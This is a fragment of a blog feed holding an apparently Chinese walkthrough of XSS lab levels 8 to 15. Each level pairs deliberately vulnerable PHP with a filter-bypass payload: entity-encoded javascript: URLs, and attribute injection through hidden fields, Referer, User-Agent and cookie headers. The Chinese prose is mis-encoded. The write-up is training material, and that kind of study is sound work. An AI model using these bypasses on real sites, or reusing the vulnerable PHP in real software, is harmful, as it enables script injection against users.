class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°å†™è½¬æ¢ï¼Œæ•æ„Ÿå­—ç¬¦åŠ <code>_</code>æ›¿æ¢ï¼ŒåŒæ—¶å¯¹<code>&quot;</code>è¿›è¡Œå®ä½“åŒ–æ›¿æ¢ï¼›</p><p>é€šè¿‡hrefå±æ€§å°†å¤„ç†çš„å€¼è¾“å‡ºï¼›</p><p>å¯ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼Œåˆ©ç”¨Javascriptä¼ªåè®®å+å…¶ä»–ç¼–ç </p><blockquote><p>å¦‚æœç”¨æˆ·é€‰æ‹©äº† <a> æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•æ£€ç´¢å¹¶æ˜¾ç¤º href å±æ€§æŒ‡å®šçš„ URL æ‰€è¡¨ç¤ºçš„æ–‡æ¡£ï¼Œæˆ–è€…æ‰§è¡Œ JavaScript è¡¨è¾¾å¼ã€æ–¹æ³•å’Œå‡½æ•°çš„åˆ—è¡¨ã€‚</a></p></blockquote><p>å°†æ•æ„Ÿå­—ç¬¦ä¸­çš„éƒ¨åˆ†å­—æ¯ASCIIè½¬URLç¼–ç ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javascri</span>&amp;<span class="selector-id">#x70</span>;<span class="selector-tag">t</span><span class="selector-pseudo">:alert()</span> <span class="selector-id">#HTML</span>å®ä½“ç¼–ç ï¼ˆ<span class="selector-tag">HEX</span>ï¼‰ </span><br><span class="line"><span class="selector-tag">javascri</span>&amp;<span class="selector-id">#112</span>;<span class="selector-tag">t</span><span class="selector-pseudo">:alert()</span>   <span class="selector-id">#HTML</span>å®ä½“ç¼–ç ï¼ˆ<span class="selector-tag">DEC</span>ï¼‰</span><br></pre></td></tr></table></figure><p>ğŸ–ï¼š</p><ul><li><p><a href="https://www.cnblogs.com/polk6/p/html-entity.html" target="_blank" rel="noopener">HTML Entity å­—ç¬¦å®ä½“(å­—ç¬¦è½¬ä¹‰)</a></p></li><li><p><a href="https://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">HTML URL ç¼–ç </a></p></li></ul><h3 id="ç¬¬9å…³"><a href="#ç¬¬9å…³" class="headerlink" title="ç¬¬9å…³"></a>ç¬¬9å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>å­—ç¬¦è½¬ä¸ºå°å†™ï¼Œæ•æ„Ÿå­—ç¬¦æ›¿æ¢ï¼›</p></li><li><p>strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p></li></ul><blockquote><p><strong>æ³¨é‡Šï¼š</strong>strpos() å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p><p><strong>è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚</strong></p><p><strong>æ³¨é‡Šï¼š</strong>å­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚</p></blockquote><ul><li>é€šè¿‡hrefå±æ€§å°†å¤„ç†çš„å€¼è¾“å‡ºï¼›</li></ul><p>éœ€è¦ä½¿strpos()å‡½æ•°çš„è¿”å›ç»“æœä¸ä¸ºfalseï¼Œå³åœ¨keywordä¸­éœ€è¦åŒ…å«<code>http://</code>ï¼›</p><p>å¯é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§æ€è·¯ï¼š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ³¨é‡Šï¼š</span><br><span class="line">javascri&amp;<span class="attr">#x70</span>;t:alert<span class="comment">()</span><span class="comment">//http://</span></span><br><span class="line">javascri&amp;<span class="attr">#x70</span>;t:alert<span class="comment">()</span><span class="comment">/*http://*/</span></span><br></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä½ç½®æ”¾åœ¨å¼¹çª—æç¤ºé‡Œ</span><br><span class="line"><span class="selector-tag">javascri</span><span class="selector-tag">&amp;</span><span class="selector-id">#x70</span>;<span class="selector-tag">t</span><span class="selector-pseudo">:alert('http</span>:<span class="comment">//')</span></span><br></pre></td></tr></table></figure><h3 id="ç¬¬10å…³"><a href="#ç¬¬10å…³" class="headerlink" title="ç¬¬10å…³"></a>ç¬¬10å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡GETä¼ å€¼çš„æœ‰ä¸¤ä¸ªå‚æ•°keywordå’Œt_sortï¼Œt_sortå­—ç¬¦ä¸­çš„<code>&lt;&gt;</code>è¢«æ›¿æ¢ä¸ºç©ºï¼›</li><li>å­˜åœ¨ä¸‰ä¸ªéšè—çš„inputè¾“å…¥æ¡†</li></ul><p>å¯æ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=<span class="string">"type="</span><span class="built_in">text</span><span class="string">" onclick = "</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="ç¬¬11å…³"><a href="#ç¬¬11å…³" class="headerlink" title="ç¬¬11å…³"></a>ç¬¬11å…³</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…³é”®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];<span class="comment">//è·å–HTTPä¸­refererä¿¡æ¯</span></span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line">&lt;input name=<span class="string">"t_ref"</span>  value=<span class="string">"'.$str33.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure><p>å¯å¯¹refereræ³¨å…¥ï¼›</p><p>æŠ“åŒ…ï¼ŒRefererå¤„æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">"onclick=alert(1) type="</span>text<span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="ç¬¬12å…³"><a href="#ç¬¬12å…³" class="headerlink" title="ç¬¬12å…³"></a>ç¬¬12å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸11å…³ç±»ä¼¼ï¼Œåœ¨user_agentå¤„æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onmouseover=alert(1)  type="</span>text<span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="ç¬¬13å…³"><a href="#ç¬¬13å…³" class="headerlink" title="ç¬¬13å…³"></a>ç¬¬13å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ğŸ–ï¼š<a href="https://www.w3school.com.cn/php/func_http_setcookie.asp" target="_blank" rel="noopener">setcookie() å‡½æ•°</a></p><blockquote><p>setcookie() å‡½æ•°å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª HTTP cookieã€‚</p></blockquote><p>å…³é”®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line">&lt;input name=<span class="string">"t_cook"</span>  value=<span class="string">"'.$str33.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç›´æ¥æŠ“åŒ…ä¿®æ”¹cookieä¸­çš„userå€¼å³å¯:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="string">" onclick=alert(1) type="</span>text<span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="ç¬¬14å…³"><a href="#ç¬¬14å…³" class="headerlink" title="ç¬¬14å…³"></a>ç¬¬14å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>ğŸ–ï¼š</p><p><strong>ng-include</strong> æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p><p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p><p><strong>ng-include</strong> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚</p></blockquote><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œå¯æ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=level1.php?name=1'window.alert()</span><br></pre></td></tr></table></figure><h3 id="ç¬¬15å…³"><a href="#ç¬¬15å…³" class="headerlink" title="ç¬¬15å…³"></a>ç¬¬15å…³</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è€ƒè™‘ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;img%<span class="number">0</span>dsrc=<span class="number">1</span>%<span class="number">0</span>donerror=alert()&gt;</span><br></pre></td></tr></table></figure><p>ç»“æŸï¼</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  ,ad8888ba,                                      <span class="number">88</span>             <span class="number">88</span>               <span class="number">88</span>           <span class="number">88</span>  </span><br><span class="line"> d8<span class="string">"'    `"</span><span class="number">8</span>b                                     <span class="number">88</span>             <span class="number">88</span>               <span class="number">88</span>           <span class="number">88</span>  </span><br><span class="line">d8'                                               <span class="number">88</span>             <span class="number">88</span>               <span class="number">88</span>           <span class="number">88</span>  </span><br><span class="line"><span class="number">88</span>              ,adPPYba,    ,adPPYba,    ,adPPYb,<span class="number">88</span>             <span class="number">88</span>   ,adPPYba,   <span class="number">88</span>,dPPYba,   <span class="number">88</span>  </span><br><span class="line"><span class="number">88</span>      <span class="number">88888</span>  a8<span class="string">"     "</span><span class="number">8</span>a  a8<span class="string">"     "</span><span class="number">8</span>a  a8<span class="string">"    `Y88             88  a8"</span>     <span class="string">"8a  88P'    "</span><span class="number">8</span>a  <span class="number">88</span>  </span><br><span class="line">Y8,        <span class="number">88</span>  <span class="number">8</span>b       d8  <span class="number">8</span>b       d8  <span class="number">8</span>b       <span class="number">88</span>             <span class="number">88</span>  <span class="number">8</span>b       d8  <span class="number">88</span>       d8  <span class="string">""</span>  </span><br><span class="line"> Y8a.    .a88  <span class="string">"8a,   ,a8"</span>  <span class="string">"8a,   ,a8"</span>  <span class="string">"8a,   ,d88     88,   ,d88  "</span><span class="number">8</span>a,   ,a8<span class="string">"  88b,   ,a8"</span>  aa  </span><br><span class="line">  `<span class="string">"Y88888P"</span>    `<span class="string">"YbbdP"</span>'    `<span class="string">"YbbdP"</span>'    `<span class="string">"8bbdP"</span>Y8      <span class="string">"Y8888P"</span>    `<span class="string">"YbbdP"</span>'   <span class="number">8</span>Y<span class="string">"Ybbd8"</span>'   <span class="number">88</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ç¬¬1å…³&quot;&gt;&lt;a href=&quot;#ç¬¬1å…³&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬1å…³&quot;&gt;&lt;/a&gt;ç¬¬1å…³&lt;/h3&gt;&lt;p&gt;è¾“å…¥å˜é‡è¢«ç›´æ¥è¾“å‡ºï¼›&lt;/p&gt;
&lt;p&gt;å°è¯•ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
    
      <category term="XSS" scheme="https://singlemindedt.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶åŒ…å«æ¼æ´</title>
    <link href="https://singlemindedt.github.io/2020/08/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-1/"/>
    <id>https://singlemindedt.github.io/2020/08/04/æ–‡ä»¶åŒ…å«æ¼æ´-1/</id>
    <published>2020-08-04T01:27:35.000Z</published>
    <updated>2020-08-04T01:29:57.191Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/3514f0fd79f7" target="_blank" rel="noopener">æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ æ€»ç»“</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/3514f0fd79f7&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ æ€»ç»“&lt;/a&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Upload-labsè®°å½•</title>
    <link href="https://singlemindedt.github.io/2020/08/03/Upload-labs%E8%AE%B0%E5%BD%95/"/>
    <id>https://singlemindedt.github.io/2020/08/03/Upload-labsè®°å½•/</id>
    <published>2020-08-03T03:42:09.000Z</published>
    <updated>2020-08-03T12:48:09.328Z</updated>
    
